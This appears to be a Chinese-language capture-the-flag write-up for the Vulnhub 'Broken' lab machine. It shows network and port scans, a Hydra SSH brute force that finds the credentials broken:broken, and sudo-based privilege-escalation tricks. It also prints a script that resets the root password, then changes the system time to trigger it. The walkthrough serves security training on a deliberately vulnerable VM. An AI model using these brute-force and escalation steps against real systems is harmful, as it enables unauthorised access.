## 👑Vulnhub Broken

### 一、操作文档

```
[Vulnhub - Broken-Gallery writeup (mzfr.me)](https://blog.mzfr.me/vulnhub-writeups/2019-08-21-Broken)
```

### 二、靶机信息

```
IP：192.168.184.135
开启的端口：22，80
用户名：bob
login: broken   password: broken
```

### 三、获取基本信息

#### 1、扫描网段IP

```shell
netdiscover -r 192.168.184.0/24  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.184.1   00:50:56:c0:00:08      1      60  VMware, Inc.                    
 192.168.184.2   00:50:56:f8:49:8c      1      60  VMware, Inc.                    
 192.168.184.135 00:0c:29:05:05:03      1      60  VMware, Inc.      	#发现被攻击者IP              
 192.168.184.254 00:50:56:e2:c5:b4      1      60  VMware, Inc.  
```

#### 2、端口扫描

> 发现开启了==22端口和80端口==

```
nmap -sC -sV 192.168.184.135 -n -vv --min-rate=2000
 _____________________________________________________________________________
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 39:5e:bf:8a:49:a3:13:fa:0d:34:b8:db:26:57:79:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsDP1G9p8pMW+TiKn0Exn6d2tGTTPGrKsIAlCWxUoZu/Jz+teqiDxZoQArXlhK/SgXXJv6ufJHMcgWhFOdGG/8Jfm46M7qURTWqTER5f7aNimHTvcBB/Zcnr1cSE+Yt3UgeguQ2VBTqPnESNjIinj5f7OrEJCG6Uvf221Wijzvb6KrYv5LNfrh8UJJ6ieis13aqvjwN1MQdKwMWYAV/2aPLME59TVyqneRDOvFZRDEPMHGJB3ZoNrlNudDf6UqZuLViplnkaN+SuxAWNXYG+g1fA578fNVIzI7bHAYDbCGFZh87TLKHvJvgqlWLDQvo8irzHlWvIpehvbpthnGIG0V
|   256 20:d7:72:be:30:6a:27:14:e1:e6:c2:16:7a:40:c8:52 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOedB//c64utUEo+gsmsh26dzZa0eMsc83InMyXD0rEepjTXqxbplJWFzx3rQSElxwdql+BsaQBI9qg+XROp9ZQ=
|   256 84:a0:9a:59:61:2a:b7:1e:dd:6e:da:3b:91:f9:a0:c6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIwpzv0aEpNMhO0avZsZ46zXc0aPO2V+867IaJkhJuSN
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 55K   2019-08-09 01:20  README.md
| 1.1K  2019-08-09 01:21  gallery.html
| 259K  2019-08-09 01:11  img_5terre.jpg
| 114K  2019-08-09 01:11  img_forest.jpg
| 663K  2019-08-09 01:11  img_lights.jpg
| 8.4K  2019-08-09 01:11  img_mountains.jpg
|_
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 00:0C:29:05:05:03 (VMware)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 四、查看80端口的信息

![image-20220517172556091](https://yang-typora.oss-cn-beijing.aliyuncs.com/202208041716404.png)

- 发现包含几张图片和文本

![image-20220517172834754](https://yang-typora.oss-cn-beijing.aliyuncs.com/202208041716471.png)

![image-20220517173019203](https://yang-typora.oss-cn-beijing.aliyuncs.com/202208041716321.png)

#### 1、由于发现了图片，所以考虑图片隐写，查看图片信息

![image-20220517173406620](https://yang-typora.oss-cn-beijing.aliyuncs.com/202208041716392.png)

> 未发现隐写

#### 2、查看是否含有隐藏目录

`dirsearch`

```
dirsearch -u 192.168.184.135
```

![image-20220517174012903](https://yang-typora.oss-cn-beijing.aliyuncs.com/202208041716444.png)

> 未发现隐藏目录

### 五、CyberChef解码

- `  = `考虑是否为Base64  
- 用`From Charcode`解码

![image-20220517174659595](https://yang-typora.oss-cn-beijing.aliyuncs.com/202208041716505.png)

- 获取到的图片信息为

![image-20220517174801177](https://yang-typora.oss-cn-beijing.aliyuncs.com/202208041716042.png)

### 六、将获取到的信息形成字典

```
hello
bob
broken
cheers
avrahamcohen.ac
```

### 七、使用九头蛇爆破

```
hydra -L test.txt -P test.txt ssh://192.168.184.135

[22][ssh] host: 192.168.184.135   login: broken   password: broken
```

### 八、远程SSH链接

```
ssh broken@192.168.184.135
```

### 九、查看自己的权限

```
broken@ubuntu:~$ sudo -l
Matching Defaults entries for broken on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User broken may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/timedatectl
    (ALL) NOPASSWD: /sbin/reboot
```

- 查看目录
- 是否可以进入root目录
- 查看是否有隐藏文件
- 查看passwd文件
- 查看是否可以替换命令
  - 快捷方式是否可以更改到别的命令
- `sudo -i`可直接进入root
- `sudo man man`然后输入`!`可直接进入root

### 十、查看历史命令

```
history | more
```

- 写入密码

![image-20220517180921079](https://yang-typora.oss-cn-beijing.aliyuncs.com/202208041716966.png)

- 发现查看过此文档

![image-20220517180843384](https://yang-typora.oss-cn-beijing.aliyuncs.com/202208041716989.png)

- 查看password-policy.sh文档

```
broken@ubuntu:~$ cat /etc/init.d/password-policy.sh 
#!/bin/bash

DAYOFWEEK=$(date +"%u")
echo DAYOFWEEK: $DAYOFWEEK

if [ "$DAYOFWEEK" -eq 4 ]
then
	sudo sh -c 'echo root:TodayIsAgoodDay | chpasswd'
fi



#if [ "$DAYOFWEEK" == 4 
```

==发现每个周四将密码改为TodayIsAgoodDay==

**将系统时间改为周四**

### 十一、更改系统时间

```
broken@ubuntu:~$ sudo timedatectl set-time '2022-05-19 12:00'
```

![image-20220517181605512](https://yang-typora.oss-cn-beijing.aliyuncs.com/202208041716032.png)
